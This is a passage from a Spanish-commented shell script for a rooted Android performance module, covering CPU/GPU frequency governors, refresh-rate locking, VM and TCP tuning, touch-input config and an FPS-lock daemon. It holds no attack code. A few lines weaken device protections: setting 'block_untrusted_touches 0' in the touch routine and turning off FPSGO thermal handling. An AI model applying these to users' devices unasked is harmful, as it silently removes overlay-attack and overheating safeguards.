    kwrite -1      /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}
g99_gpu_balance() {
    [ "$IS_G99" = "1" ] || return
    kwrite -1 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
    kwrite -1 /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}
g99_gpu_save() {
    [ "$IS_G99" = "1" ] || return
    kwrite 400000 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
    kwrite 400000 /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}

# ──────────────────────────────────────────
#  CPU UNIVERSAL
# ──────────────────────────────────────────
cpu_max() {
    # FIX anti-throttling: governor dinámico + min libre
    # Antes: performance + min=MAX → CPU al 100% siempre → thermal throttling
    # Ahora: schedutil + max=MAX + min=MIN → bursts al 100% solo cuando hay carga real
    for p in /sys/devices/system/cpu/cpufreq/policy*; do
        [ -d "$p" ] || continue
        MAX=$(cat "$p/cpuinfo_max_freq" 2>/dev/null); [ -z "$MAX" ] && continue
        MIN=$(cat "$p/cpuinfo_min_freq" 2>/dev/null); [ -z "$MIN" ] && MIN=0
        kwrite "schedutil" "$p/scaling_governor" 2>/dev/null || \
            kwrite "interactive" "$p/scaling_governor" 2>/dev/null
        kwrite "$MAX" "$p/scaling_max_freq"
        kwrite "$MIN" "$p/scaling_min_freq"
    done
    g85_cpu_max
    g99_cpu_max
}
cpu_max_gaming() {
    # Gaming: techo al máximo + piso al 50% → el governor nunca cae demasiado bajo
    # entre frames ligeros, evitando la latencia de rampa que causa micro-lags.
    # El schedutil puede escalar libremente DENTRO de ese rango [50%..100%].
    for p in /sys/devices/system/cpu/cpufreq/policy*; do
        [ -d "$p" ] || continue
        MAX=$(cat "$p/cpuinfo_max_freq" 2>/dev/null); [ -z "$MAX" ] && continue
        MIN=$(cat "$p/cpuinfo_min_freq" 2>/dev/null); [ -z "$MIN" ] && MIN=0
        FLOOR=$(awk "BEGIN{printf \"%d\", $MAX*0.50}")
        [ "$FLOOR" -lt "$MIN" ] 2>/dev/null && FLOOR=$MIN
        kwrite "schedutil" "$p/scaling_governor" 2>/dev/null || \
            kwrite "interactive" "$p/scaling_governor" 2>/dev/null
        kwrite "$MAX"   "$p/scaling_max_freq"
        kwrite "$FLOOR" "$p/scaling_min_freq"
    done
    g85_cpu_max
    g99_cpu_max
}
cpu_balance() {
    for p in /sys/devices/system/cpu/cpufreq/policy*; do
        [ -d "$p" ] || continue
        MAX=$(cat "$p/cpuinfo_max_freq" 2>/dev/null)
        MIN=$(cat "$p/cpuinfo_min_freq" 2>/dev/null)
        kwrite "schedutil" "$p/scaling_governor"
        kwrite "$MAX"      "$p/scaling_max_freq"
        kwrite "$MIN"      "$p/scaling_min_freq"
    done
    g85_cpu_balance
    g99_cpu_balance
}
cpu_save() {
    local BAT_LVL; BAT_LVL=$(cfg_get BAT_LEVEL); [ -z "$BAT_LVL" ] && BAT_LVL=1
    for p in /sys/devices/system/cpu/cpufreq/policy*; do
        [ -d "$p" ] || continue
        MIN=$(cat "$p/cpuinfo_min_freq" 2>/dev/null); [ -z "$MIN" ] && continue
        MAX=$(cat "$p/cpuinfo_max_freq" 2>/dev/null); [ -z "$MAX" ] && MAX=$MIN
        case "$BAT_LVL" in
            1) CAP=$(awk "BEGIN{printf \"%d\", $MAX*0.5}")
               kwrite "schedutil" "$p/scaling_governor"
               kwrite "$CAP"      "$p/scaling_max_freq"
               kwrite "$MIN"      "$p/scaling_min_freq" ;;
            2) CAP=$(awk "BEGIN{printf \"%d\", $MAX*0.25}")
               [ "$CAP" -lt "$MIN" ] 2>/dev/null && CAP=$MIN
               kwrite "powersave" "$p/scaling_governor"
               kwrite "$CAP"      "$p/scaling_max_freq"
               kwrite "$MIN"      "$p/scaling_min_freq" ;;
            3) kwrite "powersave" "$p/scaling_governor"
               kwrite "$MIN"      "$p/scaling_max_freq"
               kwrite "$MIN"      "$p/scaling_min_freq" ;;
        esac
    done
    g85_cpu_save
    g99_cpu_save
}

# ──────────────────────────────────────────
#  GPU UNIVERSAL
# ──────────────────────────────────────────
gpu_max() {
    case "$SOC" in
        1) # FIX anti-throttling MTK GPU:
           # fix_target_opp_index=0 y governor "performance" pegan la GPU al OPP maximo siempre.
           # "simple_ondemand" + boost 100 permite bursts al max sin forzar idle al 100%.
           kwrite -1              /proc/gpufreqv2/fix_target_opp_index 2>/dev/null
           kwrite "simple_ondemand" /sys/class/devfreq/13000000.mali/governor 2>/dev/null
           kwrite "coarse_demand" /sys/class/misc/mali0/device/power_policy 2>/dev/null
           kwrite 100             /sys/kernel/ged/hal/gpu_boost_level 2>/dev/null
           kwrite "disable"       /proc/gpufreqv2/aging_mode 2>/dev/null
           g85_gpu_max
           g99_gpu_max ;;
        2) # FIX anti-throttling Snapdragon GPU:
           # force_clk_on=1 fuerza el clock GPU siempre activo aunque no haya carga.
           # devfreq_unlock deja el max disponible pero el governor decide la freq real.
           devfreq_unlock /sys/class/kgsl/kgsl-3d0/devfreq
           kwrite 0 /sys/class/kgsl/kgsl-3d0/bus_split ;;
        3) local gp; gp=$(find /sys/kernel/gpu /sys/devices/platform -maxdepth 3 -name "gpu_max_clock" 2>/dev/null | head -1 | sed 's|/gpu_max_clock||')
           if [ -n "$gp" ]; then
               local mxf mnf
               mxf=$(_maxfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               mnf=$(_minfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               # FIX: solo el techo al max, piso libre — evita GPU al 100% sostenido
               [ -n "$mxf" ] && kwrite "$mxf" "$gp/gpu_max_clock"
               [ -n "$mnf" ] && kwrite "$mnf" "$gp/gpu_min_clock"
           fi ;;
        *) local mali; mali=$(find /sys/devices/platform -maxdepth 4 -name "governor" -path "*/mali*" 2>/dev/null | head -1)
           # FIX: simple_ondemand en lugar de performance — GPU escala con la carga real
           [ -n "$mali" ] && kwrite "simple_ondemand" "$mali" 2>/dev/null ;;
    esac
}
gpu_max_gaming() {
    # Gaming: techo al máximo del dispositivo + piso al 50% del máximo.
    # El governor sigue decidiendo la freq real pero nunca cae por debajo del piso,
    # eliminando la latencia de rampa entre frames que causa micro-lags.
    # Todo se calcula leyendo los nodos del kernel — sin valores hardcodeados.
    case "$SOC" in
        1) # MTK/GED: leer upbound ya configurado por gpu_max, calcular 50% dinámico
           kwrite -1              /proc/gpufreqv2/fix_target_opp_index 2>/dev/null
           kwrite "simple_ondemand" /sys/class/devfreq/13000000.mali/governor 2>/dev/null
           kwrite "coarse_demand" /sys/class/misc/mali0/device/power_policy 2>/dev/null
           kwrite 100             /sys/kernel/ged/hal/gpu_boost_level 2>/dev/null
           kwrite "disable"       /proc/gpufreqv2/aging_mode 2>/dev/null
           # Leer el OPP máximo real del driver para calcular el piso sin hardcodear
           local _upbound; _upbound=$(cat /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null)
           if [ -z "$_upbound" ] || [ "$_upbound" -le 0 ] 2>/dev/null; then
               # Fallback: leer del OPP table el primer (mayor) valor
               _upbound=$(awk -F'[@ ]' 'NR==1{print $2}' /proc/gpufreqv2/gpu_working_opp_table 2>/dev/null)
           fi
           if [ -n "$_upbound" ] && [ "$_upbound" -gt 0 ] 2>/dev/null; then
               local _floor; _floor=$(awk "BEGIN{printf \"%d\", $_upbound*0.50}")
               kwrite "$_floor" /sys/kernel/ged/hal/custom_boost_gpu_freq 2>/dev/null
           fi
           g85_gpu_max
           g99_gpu_max ;;
        2) # Snapdragon: leer available_frequencies de kgsl, fijar piso al 50% del max
           devfreq_unlock /sys/class/kgsl/kgsl-3d0/devfreq
           kwrite 0 /sys/class/kgsl/kgsl-3d0/bus_split
           local _kmax; _kmax=$(_maxfreq /sys/class/kgsl/kgsl-3d0/devfreq/available_frequencies 2>/dev/null)
           if [ -n "$_kmax" ] && [ "$_kmax" -gt 0 ] 2>/dev/null; then
               local _kfloor; _kfloor=$(awk "BEGIN{printf \"%d\", $_kmax*0.50}")
               kwrite "$_kfloor" /sys/class/kgsl/kgsl-3d0/devfreq/min_freq 2>/dev/null
           fi ;;
        3) # Exynos: calcular piso 50% del max desde gpu_available_frequencies
           local gp; gp=$(find /sys/kernel/gpu /sys/devices/platform -maxdepth 3 -name "gpu_max_clock" 2>/dev/null | head -1 | sed 's|/gpu_max_clock||')
           if [ -n "$gp" ]; then
               local mxf; mxf=$(_maxfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               if [ -n "$mxf" ] && [ "$mxf" -gt 0 ] 2>/dev/null; then
                   local gfloor; gfloor=$(awk "BEGIN{printf \"%d\", $mxf*0.50}")
                   kwrite "$mxf"    "$gp/gpu_max_clock"
                   kwrite "$gfloor" "$gp/gpu_min_clock"
               fi
           fi ;;
        *) # Generic mali devfreq: piso 50% del max disponible
           local mali_dev; mali_dev=$(find /sys/class/devfreq -maxdepth 1 -name "*mali*" 2>/dev/null | head -1)
           if [ -n "$mali_dev" ]; then
               local gmx; gmx=$(_maxfreq "$mali_dev/available_frequencies" 2>/dev/null)
               if [ -n "$gmx" ] && [ "$gmx" -gt 0 ] 2>/dev/null; then
                   local gflr; gflr=$(awk "BEGIN{printf \"%d\", $gmx*0.50}")
                   kwrite "$gmx"  "$mali_dev/max_freq" 2>/dev/null
                   kwrite "$gflr" "$mali_dev/min_freq" 2>/dev/null
               fi
               local gmal; gmal=$(find /sys/devices/platform -maxdepth 4 -name "governor" -path "*/mali*" 2>/dev/null | head -1)
               [ -n "$gmal" ] && kwrite "simple_ondemand" "$gmal" 2>/dev/null
           fi ;;
    esac
}
gpu_balance() {
    case "$SOC" in
        1) kwrite -1                /proc/gpufreqv2/fix_target_opp_index
           kwrite "simple_ondemand" /sys/class/devfreq/13000000.mali/governor
           kwrite "coarse_demand"   /sys/class/misc/mali0/device/power_policy
           kwrite -1                /sys/kernel/ged/hal/gpu_boost_level
           tweak "enable"           /proc/gpufreqv2/aging_mode
           g85_gpu_balance
           g99_gpu_balance ;;
        2) devfreq_unlock /sys/class/kgsl/kgsl-3d0/devfreq
           kwrite 1 /sys/class/kgsl/kgsl-3d0/bus_split
           kwrite 0 /sys/class/kgsl/kgsl-3d0/force_clk_on ;;
        3) local gp; gp=$(find /sys/kernel/gpu /sys/devices/platform -maxdepth 3 -name "gpu_max_clock" 2>/dev/null | head -1 | sed 's|/gpu_max_clock||')
           [ -n "$gp" ] && { local mxf mnf
               mxf=$(_maxfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               mnf=$(_minfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               [ -n "$mxf" ] && kwrite "$mxf" "$gp/gpu_max_clock"
               [ -n "$mnf" ] && kwrite "$mnf" "$gp/gpu_min_clock"; } ;;
        *) local mali; mali=$(find /sys/devices/platform -maxdepth 4 -name "governor" -path "*/mali*" 2>/dev/null | head -1)
           [ -n "$mali" ] && kwrite "simple_ondemand" "$mali" ;;
    esac
}
gpu_save() {
    case "$SOC" in
        1) local mi; mi=$(awk -F'[][]' '{print $2}' /proc/gpufreqv2/gpu_working_opp_table 2>/dev/null | tail -1)
           [ -n "$mi" ] && tweak "$mi" /proc/gpufreqv2/fix_target_opp_index
           kwrite "powersave"     /sys/class/devfreq/13000000.mali/governor
           kwrite "coarse_demand" /sys/class/misc/mali0/device/power_policy
           kwrite -1              /sys/kernel/ged/hal/gpu_boost_level
           g85_gpu_save
           g99_gpu_save ;;
        2) devfreq_min /sys/class/kgsl/kgsl-3d0/devfreq ;;
        3) local gp; gp=$(find /sys/kernel/gpu /sys/devices/platform -maxdepth 3 -name "gpu_max_clock" 2>/dev/null | head -1 | sed 's|/gpu_max_clock||')
           [ -n "$gp" ] && { local mnf; mnf=$(_minfreq "$gp/gpu_available_frequencies" 2>/dev/null)
               [ -n "$mnf" ] && { tweak "$mnf" "$gp/gpu_max_clock"; tweak "$mnf" "$gp/gpu_min_clock"; }; } ;;
        *) local mali; mali=$(find /sys/devices/platform -maxdepth 4 -name "governor" -path "*/mali*" 2>/dev/null | head -1)
           [ -n "$mali" ] && kwrite "powersave" "$mali" ;;
    esac
}

# ──────────────────────────────────────────
#  DISPLAY REFRESH RATE — helpers v4.2
#
#  Otros módulos aplican el refresh rate UNA sola vez desde la UI y se
#  pierde al apagar pantalla — SurfaceFlinger lo resetea.
#  Estas funciones son llamadas desde android_gaming/android_perf
#  Y re-aplicadas cada ciclo por el Lock FPS Daemon.
# ──────────────────────────────────────────
_apply_display_refresh_rate() {
    local peak="${1:-120}"
    local min="${2:-60}"
    # settings persiste en DB de Android (sobrevive pantalla off)
    settings put system peak_refresh_rate "$peak"  2>/dev/null
    settings put system min_refresh_rate  "$min"   2>/dev/null
    # SF idle_timer=0: impide que SF baje el panel por "inactividad"
    # (muy comun en menus quietos de juegos — causa drop a 60Hz)
    setprop debug.sf.set_idle_timer_ms 0             2>/dev/null
    # Binder 1035: fuerza el frame rate a nivel compositor SF
    service call SurfaceFlinger 1035 i32 "$peak"     2>/dev/null
}
_restore_display_refresh_rate() {
    settings delete system peak_refresh_rate         2>/dev/null
    settings delete system min_refresh_rate          2>/dev/null
    setprop debug.sf.set_idle_timer_ms 500           2>/dev/null
    service call SurfaceFlinger 1035 i32 0           2>/dev/null
}

# ──────────────────────────────────────────
#  DVFSRC (MediaTek)
# ──────────────────────────────────────────
dvfsrc_max() {
    [ "$SOC" = "1" ] || return
    # FIX v4.2: usar kwrite (no tweak) — tweak hace chmod 444 y bloquea el
    # Thermal HAL de MTK que necesita escribir en estos nodos para regular
    # Vcore/DDR. Con nodos bloqueados el throttle llega de golpe → microlag.
    kwrite "performance" /sys/class/devfreq/mtk-dvfsrc-devfreq/governor
    kwrite 0 /sys/devices/platform/10012000.dvfsrc/helio-dvfsrc/dvfsrc_req_ddr_opp   2>/dev/null
    kwrite 0 /sys/kernel/helio-dvfsrc/dvfsrc_force_vcore_dvfs_opp                    2>/dev/null
}
dvfsrc_balance() {
    [ "$SOC" = "1" ] || return
    kwrite "simple_ondemand" /sys/class/devfreq/mtk-dvfsrc-devfreq/governor
    kwrite -1 /sys/devices/platform/10012000.dvfsrc/helio-dvfsrc/dvfsrc_req_ddr_opp  2>/dev/null
    kwrite -1 /sys/kernel/helio-dvfsrc/dvfsrc_force_vcore_dvfs_opp                   2>/dev/null
}
dvfsrc_save() {
    [ "$SOC" = "1" ] || return
    kwrite "powersave" /sys/class/devfreq/mtk-dvfsrc-devfreq/governor
}

# ──────────────────────────────────────────
#  FPSGO (MediaTek)
# ──────────────────────────────────────────
fpsgo_gaming() {
    [ "$SOC" = "1" ] || return
    tweak 1 /sys/kernel/fpsgo/common/fpsgo_enable  2>/dev/null
    tweak 0 /sys/kernel/fpsgo/common/force_onoff   2>/dev/null
    tweak 0 /sys/kernel/fpsgo/common/stop_boost    2>/dev/null
    tweak 0 /sys/kernel/fpsgo/fbt/thrm_enable      2>/dev/null
}
fpsgo_normal() {
    [ "$SOC" = "1" ] || return
    tweak 2 /sys/kernel/fpsgo/common/force_onoff   2>/dev/null
}

# ──────────────────────────────────────────
#  ANDROID POWER
# ──────────────────────────────────────────
android_perf() {
    settings put global window_animation_scale     0.25 2>/dev/null
    settings put global transition_animation_scale 0.25 2>/dev/null
    settings put global animator_duration_scale    0.25 2>/dev/null
    cmd power set-mode 0 2>/dev/null
    cmd power set-fixed-performance-mode-enabled true  2>/dev/null
    cmd power set-adaptive-power-saver-enabled   false 2>/dev/null
    settings delete global battery_saver_constants 2>/dev/null
    cmd looper_stats disable 2>/dev/null
    settings put secure high_priority 1 2>/dev/null
    # ── VM: Performance — favorece fluidez, menos swap ──
    kwrite 20  /proc/sys/vm/swappiness               2>/dev/null
    kwrite 15  /proc/sys/vm/dirty_ratio               2>/dev/null
    kwrite 8   /proc/sys/vm/dirty_background_ratio    2>/dev/null
    kwrite 80  /proc/sys/vm/vfs_cache_pressure        2>/dev/null
    kwrite 1   /proc/sys/vm/oom_dump_tasks            2>/dev/null
    kwrite 10  /proc/sys/vm/compaction_proactiveness  2>/dev/null
    kwrite 1   /proc/sys/vm/page-cluster              2>/dev/null
    kwrite 4096 /proc/sys/vm/min_free_kbytes          2>/dev/null
    kwrite 100 /proc/sys/vm/watermark_scale_factor    2>/dev/null
    _apply_display_refresh_rate 120 60
}
android_balance() {
    settings put global window_animation_scale     0.5 2>/dev/null
    settings put global transition_animation_scale 0.5 2>/dev/null
    settings put global animator_duration_scale    0.5 2>/dev/null
    cmd power set-mode 0 2>/dev/null
    cmd power set-fixed-performance-mode-enabled false 2>/dev/null
    cmd power set-adaptive-power-saver-enabled   false 2>/dev/null
    settings delete global battery_saver_constants 2>/dev/null
    cmd looper_stats disable 2>/dev/null
    settings put secure high_priority 1 2>/dev/null
    # ── VM: Balance — valores neutros del sistema ──
    kwrite 60  /proc/sys/vm/swappiness               2>/dev/null
    kwrite 20  /proc/sys/vm/dirty_ratio               2>/dev/null
    kwrite 10  /proc/sys/vm/dirty_background_ratio    2>/dev/null
    kwrite 100 /proc/sys/vm/vfs_cache_pressure        2>/dev/null
    kwrite 1   /proc/sys/vm/oom_dump_tasks            2>/dev/null
    kwrite 20  /proc/sys/vm/compaction_proactiveness  2>/dev/null
    kwrite 3   /proc/sys/vm/page-cluster              2>/dev/null
    kwrite 4096 /proc/sys/vm/min_free_kbytes          2>/dev/null
    kwrite 150 /proc/sys/vm/watermark_scale_factor    2>/dev/null
    _restore_display_refresh_rate
}
android_save() {
    settings put global window_animation_scale     1.0 2>/dev/null
    settings put global transition_animation_scale 1.0 2>/dev/null
    settings put global animator_duration_scale    1.0 2>/dev/null
    cmd power set-mode 1 2>/dev/null
    cmd power set-fixed-performance-mode-enabled false 2>/dev/null
    cmd power set-adaptive-power-saver-enabled   true  2>/dev/null
    cmd power thermalservice override-status 3 2>/dev/null
    settings put global battery_saver_constants \
        "animation_disabled=true,launch_boost_disabled=true,vibration_disabled=true" 2>/dev/null
    settings put secure high_priority 0 2>/dev/null
    # ── VM: Battery — prioriza bateria sobre RAM ──
    kwrite 80  /proc/sys/vm/swappiness               2>/dev/null
    kwrite 20  /proc/sys/vm/dirty_ratio               2>/dev/null
    kwrite 10  /proc/sys/vm/dirty_background_ratio    2>/dev/null
    kwrite 100 /proc/sys/vm/vfs_cache_pressure        2>/dev/null
    kwrite 1   /proc/sys/vm/oom_dump_tasks            2>/dev/null
    kwrite 20  /proc/sys/vm/compaction_proactiveness  2>/dev/null
    kwrite 3   /proc/sys/vm/page-cluster              2>/dev/null
    kwrite 4096 /proc/sys/vm/min_free_kbytes          2>/dev/null
    kwrite 150 /proc/sys/vm/watermark_scale_factor    2>/dev/null
    _restore_display_refresh_rate
}
android_gaming() {
    settings put global window_animation_scale     0.0 2>/dev/null
    settings put global transition_animation_scale 0.0 2>/dev/null
    settings put global animator_duration_scale    0.0 2>/dev/null
    cmd power set-mode 0 2>/dev/null
    cmd power set-fixed-performance-mode-enabled true  2>/dev/null
    cmd power set-adaptive-power-saver-enabled   false 2>/dev/null
    settings delete global battery_saver_constants 2>/dev/null
    cmd looper_stats disable 2>/dev/null
    settings put secure high_priority 1 2>/dev/null
    # ── VM: Gaming Pro — maxima RAM para el juego, buffer minimo estable ──
    kwrite 10  /proc/sys/vm/swappiness               2>/dev/null
    kwrite 15  /proc/sys/vm/dirty_ratio               2>/dev/null
    kwrite 10  /proc/sys/vm/dirty_background_ratio    2>/dev/null
    kwrite 50  /proc/sys/vm/vfs_cache_pressure        2>/dev/null
    kwrite 0   /proc/sys/vm/oom_dump_tasks            2>/dev/null
    kwrite 0   /proc/sys/vm/compaction_proactiveness  2>/dev/null
    # FIX v4.2: page-cluster=1 en vez de 0 — con 0 cada page fault lee
    # solo 1 página de zram, pagando el máximo costo de descompresión.
    # Con 1 lee cluster de 2 páginas: mejor prefetch sin overhead extra.
    kwrite 1   /proc/sys/vm/page-cluster              2>/dev/null
    kwrite 8192 /proc/sys/vm/min_free_kbytes          2>/dev/null
    kwrite 30  /proc/sys/vm/watermark_scale_factor    2>/dev/null
    # ── Refresh rate: fijar techo máximo para evitar que Android baje ──
    # a 60Hz por presión térmica, lo que duplica el frame time (8ms→16ms)
    _apply_display_refresh_rate 120 60
}

# ──────────────────────────────────────────
#  TOUCH ENGINE
# ──────────────────────────────────────────
apply_touch_on() {
    # ── Monitores de latencia — desactivar en gaming ──
    cmd device_config put latency_tracker enabled false 2>/dev/null
    cmd device_config put interaction_jank_monitor enabled false 2>/dev/null

    # ── Dispatcher de input — prioridad máxima ──
    cmd device_config put input max_event_latency_ms 0 2>/dev/null
    cmd device_config put input dispatcher_low_latency true 2>/dev/null
    cmd device_config put input native_boost_touch_input true 2>/dev/null
    cmd device_config put input boost_touch_dispatcher true 2>/dev/null
    cmd device_config put input ignore_window_animation_delay true 2>/dev/null
    cmd device_config put input latency_mode normal 2>/dev/null

    # ── pointer_prediction DESACTIVADO — en shooters causa toques fantasma ──
    # Nota: RTI también lo desactiva a nivel driver, ambos son consistentes
    cmd device_config put input pointer_prediction_enabled false 2>/dev/null

    # ── Resampling y sample rate ──
    # pointer_resampling_filter desactivado: sin interpolación artificial
    cmd device_config put input pointer_resampling_filter_enabled false 2>/dev/null
    cmd device_config put input touch_resample_enabled true 2>/dev/null
    cmd device_config put input touch_screen_sample_interval_ms 4 2>/dev/null
    # 240Hz solo si el panel lo soporta — Android ignora si no aplica
    cmd device_config put input touch_sample_rate_hz 240 2>/dev/null

    # ── PowerHAL — boost de frecuencias al tocar ──
    cmd device_config put powerhal touch_boost_enabled true 2>/dev/null
    cmd device_config put powerhal launch_boost_enabled true 2>/dev/null

    # ── SurfaceFlinger — sin restricción de framerate ──
    cmd device_config put surfaceflinger frame_rate_multiple_threshold 0 2>/dev/null
    cmd device_config put surfaceflinger enable_refresh_rate_overlay false 2>/dev/null

    # ── Misc ──
    settings put global block_untrusted_touches 0 2>/dev/null
    resetprop -n ro.min_pointer_dur 8 2>/dev/null

    # ── MediaTek: integración con RTI (Raw Touch Input) ──
    # Solo aplica en chips MTK — en otros SOC estas rutas no existen
    if [ "$SOC" = "1" ]; then
        # Activar modo gaming del driver táctil MTK si existe
        for node in \
            /sys/devices/virtual/input/input*/gamemode \
            /sys/touchscreen/game_mode \
            /proc/touchscreen/game_mode \
            /proc/tp_gesture/game_switch; do
            [ -f "$node" ] && echo 1 > "$node" 2>/dev/null
        done
        # Reducir latencia de reporte del panel MTK si el nodo existe
        for node in \
            /sys/devices/virtual/input/input*/report_rate \
            /proc/touchscreen/report_rate; do
            [ -f "$node" ] && echo 240 > "$node" 2>/dev/null
        done
    fi

    # ── OnePlus/OPPO/Realme: game switch táctil ──
    echo 1 > /proc/touchpanel/game_switch_enable 2>/dev/null
    echo 0 > /proc/touchpanel/oppo_tp_limit_enable 2>/dev/null
    echo 0 > /proc/touchpanel/oplus_tp_limit_enable 2>/dev/null
}
apply_touch_off() {
    cmd device_config put latency_tracker enabled true 2>/dev/null
    cmd device_config put interaction_jank_monitor enabled true 2>/dev/null
    cmd device_config put input dispatcher_low_latency false 2>/dev/null
    cmd device_config put input pointer_prediction_enabled false 2>/dev/null
    cmd device_config put input latency_mode normal 2>/dev/null
    cmd device_config put powerhal touch_boost_enabled false 2>/dev/null
    # Restaurar nodos MTK
    if [ "$SOC" = "1" ]; then
        for node in \
            /sys/devices/virtual/input/input*/gamemode \
            /sys/touchscreen/game_mode \
            /proc/touchscreen/game_mode \
            /proc/tp_gesture/game_switch; do
            [ -f "$node" ] && echo 0 > "$node" 2>/dev/null
        done
    fi
    echo 0 > /proc/touchpanel/game_switch_enable 2>/dev/null
}

# ──────────────────────────────────────────
#  SCRIPTS EXTERNOS
# ──────────────────────────────────────────

# ──────────────────────────────────────────
#  RED — GAMING (absorbe lo mejor de PingPimp)
# ──────────────────────────────────────────
net_gaming() {
    # WiFi: modo baja latencia + sin escaneos de fondo + sin logs
    cmd wifi force-low-latency-mode enabled 2>/dev/null
    cmd wifi set-scan-always-available disabled 2>/dev/null
    cmd wifi set-verbose-logging disabled -l 0 2>/dev/null

    # Power save OFF siempre en gaming — independiente del toggle Boost
    # Con power_save ON el chip introduce latencia variable (micro-lag WiFi)
    for iface in wlan0 wlan1; do
        iw dev "$iface" set power_save off 2>/dev/null || true
    done

    # Detener servicios de diagnóstico que roban CPU/red
    stop tcpdump 2>/dev/null; stop vendor.tcpdump 2>/dev/null
    stop cnss_diag 2>/dev/null; stop vendor.cnss_diag 2>/dev/null

    # Elevar techos de buffer (necesario para que tcp_rmem/wmem puedan llegar a 4MB)
    kwrite 4194304 /proc/sys/net/core/rmem_max
    kwrite 4194304 /proc/sys/net/core/wmem_max
    kwrite 4194304 /proc/sys/net/core/rmem_default
    kwrite 4194304 /proc/sys/net/core/wmem_default

    # TCP: optimizado para gaming (latencia baja, sin frenos de idle)
    kwrite 0  /proc/sys/net/ipv4/tcp_slow_start_after_idle
    kwrite 0  /proc/sys/net/ipv4/tcp_timestamps
    kwrite 1  /proc/sys/net/ipv4/tcp_window_scaling
    kwrite 1  /proc/sys/net/ipv4/tcp_no_metrics_save
    kwrite 2  /proc/sys/net/ipv4/tcp_syn_retries
    kwrite 10 /proc/sys/net/ipv4/tcp_fin_timeout
    kwrite "4096 87380 4194304" /proc/sys/net/ipv4/tcp_rmem
    kwrite "4096 87380 4194304" /proc/sys/net/ipv4/tcp_wmem

    # Cola de transmisión WiFi más larga para ráfagas de juego
    ip link set wlan0 txqueuelen 3000 2>/dev/null
    ip link set wlan1 txqueuelen 3000 2>/dev/null

    # Distribuir interrupciones WiFi/rmnet en los 4 primeros cores (RPS)
    local MASK; MASK=$(printf '%x' $(( (1 << 4) - 1 )))
    for IFACE in /sys/class/net/wlan* /sys/class/net/rmnet*; do
        [ -d "$IFACE" ] || continue
        for Q in "$IFACE"/queues/*/rps_cpus; do
            [ -f "$Q" ] && echo "$MASK" > "$Q" 2>/dev/null
        done
    done

    # Deshabilitar WiFi Direct en wpa_supplicant (gasta recursos innecesarios)
    local WPA="/data/misc/wifi/wpa_supplicant.conf"
    if [ -f "$WPA" ]; then
        grep -q "p2p_disabled=1" "$WPA" || echo "p2p_disabled=1" >> "$WPA"
    fi

    # Limpiar caché de rutas
    echo 1 > /proc/sys/net/ipv4/route/flush 2>/dev/null
}

net_normal() {
    # Restaurar WiFi a modo normal
    cmd wifi force-low-latency-mode disabled 2>/dev/null
    cmd wifi set-scan-always-available enabled 2>/dev/null

    # Restaurar power save
    for iface in wlan0 wlan1; do
        iw dev "$iface" set power_save on 2>/dev/null || true
    done

    # Restaurar techos de buffer a valores normales
    kwrite 2097152 /proc/sys/net/core/rmem_max
    kwrite 2097152 /proc/sys/net/core/wmem_max
    kwrite 212992  /proc/sys/net/core/rmem_default
    kwrite 212992  /proc/sys/net/core/wmem_default

    # Restaurar TCP a valores estables
    kwrite 1  /proc/sys/net/ipv4/tcp_slow_start_after_idle
    kwrite 1  /proc/sys/net/ipv4/tcp_timestamps
    kwrite 6  /proc/sys/net/ipv4/tcp_syn_retries
    kwrite 30 /proc/sys/net/ipv4/tcp_fin_timeout
    kwrite "4096 87380 2097152" /proc/sys/net/ipv4/tcp_rmem
    kwrite "4096 65536 2097152" /proc/sys/net/ipv4/tcp_wmem
    ip link set wlan0 txqueuelen 1000 2>/dev/null
    ip link set wlan1 txqueuelen 1000 2>/dev/null

    # Limpiar p2p_disabled si fue escrito por net_gaming
    local WPA="/data/misc/wifi/wpa_supplicant.conf"
    if [ -f "$WPA" ]; then
        sed -i '/^p2p_disabled=1$/d' "$WPA" 2>/dev/null
    fi
}
# ══════════════════════════════════════════════════════════════════
#  LOCK FPS DAEMON — v4.2  By_Rafael System
#
#  POR QUÉ FALLA EL LOCK FPS EN OTROS MÓDULOS:
#  Otros módulos solo aplican el lock UNA vez desde la UI (JS onToggle).
#  Usa "service call SurfaceFlinger 1035" que es una llamada Binder
#  en runtime — NO persiste. Android la resetea al:
#    • Apagar/encender pantalla
#    • Cualquier rotación de SurfaceFlinger
#    • Cambio de estado del display power manager
#  Por eso el toggle se "desactiva solo" — el estado real cambia
#  pero la UI no lo refleja porque guarda el flag en config.prop
#  pero nunca re-verifica ni re-aplica.
#
#  SOLUCIÓN v4.2 — Daemon persistente:
#  Loop que corre en background, lee LOCK_FPS del config cada
#  ciclo y re-aplica AMBOS métodos (settings + binder) mientras
#  haya un juego activo. Si no hay juego o LOCK_FPS=0, restaura.
#  También re-aplica al volver de pantalla apagada (detección de
#  cambio de estado del backlight).
# ══════════════════════════════════════════════════════════════════
lock_fps_daemon() {
    local _prev_lock="-1"
    local _prev_screen="on"
    local _prev_fps="-1"

    while true; do
        sleep 8

        # Leer config con cache
        _load_cfg_cache
        local _lock; _lock=$(cfg_c LOCK_FPS)
        local _fps;  _fps=$(cfg_c TARGET_FPS)
        _fps=${_fps:-60}

        # Detectar si hay juego activo (DiabloAI lo gestiona en CURRENT_GAME)
        local _game; _game=$(cfg_c CURRENT_GAME)

        # Detectar pantalla (cambio de off→on necesita re-apply)
        local _screen; _screen=$(get_screen_state)

        if [ "$_lock" = "1" ] && [ -n "$_game" ] && [ "$_game" != "ninguno" ]; then
            # Re-aplicar siempre que: lock activo + juego corriendo
            # Esto cubre el reset de SF tras pantalla off/on
            _apply_display_refresh_rate "$_fps" "$_fps"

            # Si acaba de volver la pantalla, forzar SF binder inmediato
            if [ "$_prev_screen" = "off" ] && [ "$_screen" = "on" ]; then
                sleep 1
                service call SurfaceFlinger 1035 i32 "$_fps" 2>/dev/null
            fi

            _prev_lock="1"
        else
            # Lock desactivado o sin juego: restaurar si antes estaba activo
            if [ "$_prev_lock" = "1" ] || \
               { [ "$_prev_lock" = "-1" ] && [ "$_lock" = "0" ]; }; then
                _restore_display_refresh_rate
